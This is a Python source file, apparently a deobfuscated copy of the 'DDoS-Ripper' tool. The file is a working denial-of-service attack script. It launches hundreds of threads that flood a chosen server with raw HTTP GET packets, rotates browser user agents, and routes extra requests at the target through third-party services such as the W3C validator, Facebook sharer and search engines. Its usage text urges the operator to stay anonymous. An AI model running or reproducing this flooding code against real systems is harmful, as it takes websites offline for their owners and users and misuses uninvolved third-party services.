# Here is the source code of https://github.com/palahsu/DDoS-Ripper
# Deobfuscated by Kyra (https://github.com/kyrazzx)

import sys
from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

print('''


██████╗ ██████╗  ██████╗ ███████╗    ██████╗ ██╗██████╗ ██████╗ ███████╗██████╗ 
██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║  ██║██║  ██║██║   ██║███████╗    ██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝
██║  ██║██║  ██║██║   ██║╚════██║    ██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
██████╔╝██████╔╝╚██████╔╝███████║    ██║  ██║██║██║     ██║     ███████╗██║  ██║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝    ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
                                                                                
                                                      ©EngineRipper
                                                      reference by Hammer
	  
                                                      Deobfuscated by Kyra (https://github.com/kyrazzx)
                                                      Original repo (https://github.com/palahsu/DDoS-Ripper)
''')

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
	uagent.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0")
	uagent.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
	uagent.append("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0")
	uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.1.1 Safari/603.2.4")
	uagent.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
	return(uagent)


def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	# Added some common user agents and potential bot referers
	# Note: Using external services for attacks might be less effective or get blocked quickly.
	# Be aware that some of these URLs might be honeypots or could lead to legal issues.
	bots.append("https://www.google.com/search?q=") # Google can sometimes be used indirectly
	bots.append("https://duckduckgo.com/?q=")      # DuckDuckGo
	bots.append("http://www.bing.com/search?q=")    # Bing
	# Be cautious adding more bot URLs without understanding their function and terms of service.
	return(bots)

def bot_rippering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[90magain bot is rippering...\033[0m")
			time.sleep(.1)
	except:
			time.sleep(.2)

def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[92m <--packet sent! rippering--> \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mshut<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mno connection! web server maybe down!\033[0m")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)

def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()

def dos2():
	while True:
		item=w.get()
		bot_rippering(random.choice(bots)+"http://"+host)
		w.task_done()

#def dos3():
  #  while True:
  #      item = e.get()
  #      bot_rippering(random.choice(bots)+"http://"+host)
  #      e.task_done()

def usage():
	print (''' \033[0;95mDDos Ripper 

	It is the end user's responsibility to obey all applicable laws.
	It is just like a server testing script and Your ip is visible. Please, make sure you are anonymous! 

	Usage : python3 dripper.py [-s] [-p] [-t] [-q]
	-h : -help
	-s : -server ip
	-p : -port default 80
	-q : -quiet
	
	-t : -turbo default 135 or 443 \033[0m ''')

	sys.exit()


def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Rippers")
	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	optp.add_option("-q","--quiet",dest="quiet",action='store_true', help="quiet mode") # Added quiet option
	opts, args = optp.parse_args()
	logging.basicConfig(level=logging.INFO,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 135
	else:
		thr = opts.turbo
	# Quiet mode logic
	global quiet_mode
	quiet_mode = opts.quiet if opts.quiet is not None else False


# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w,e
q = Queue()
w = Queue()
#e = Queue() # This queue wasn't actually used in the final threading logic


if __name__ == '__main__':
	# Check if headers.txt exists
	try:
		with open("headers.txt", "r") as f:
			pass # File exists, continue
	except FileNotFoundError:
		print("\033[91mError: headers.txt not found. Please create this file.\033[0m")
		# Optionally, provide default headers if the file is missing
		# data = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-us,en;q=0.5\nAccept-Encoding: gzip,deflate\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\nKeep-Alive: 115\nConnection: keep-alive"
		# sys.exit(1) # Or exit if headers are mandatory
		print("\033[93mWarning: Using default minimal headers as headers.txt was not found.\033[0m")
		data = "Accept: */*\nConnection: keep-alive" # Minimal default

	if len(sys.argv) < 2:
		usage()

	get_parameters()

	# Only print banner and initial messages if not in quiet mode
	if not quiet_mode:
		print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
		print("\033[94mPlease wait...\033[0m")

	user_agent()
	my_bots()
	time.sleep(5) # Allow time to read initial messages if not quiet

	try:
		# Start Direct Attack Threads
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			# Start Bot Attack Threads
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
			# t3 = threading.Thread(target=dos3) # dos3 was commented out, so no need to start
			# t3.daemon = True  # if thread is exist, it dies
			# t3.start()

		# Populate Queues
		start = time.time()
		item = 0
		while True:
			if item>1800: # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
			#e.put(item) # e queue not used by active threads
			# Print progress only if not in quiet mode
			if not quiet_mode:
				sys.stdout.write("\r Ripping... | Sent: "+str(item)+" packets | Time: "+str(int(time.time()-start))+"s \033[0;95m<EngineRipper>\033[0m")
				sys.stdout.flush()
			else:
				# Even in quiet mode, maybe sleep a tiny bit to prevent 100% CPU if loops are too fast
				time.sleep(0.001)

	except KeyboardInterrupt:
		print ('\n\033[91m[-] Canceled by user\033[0m')
		sys.exit()
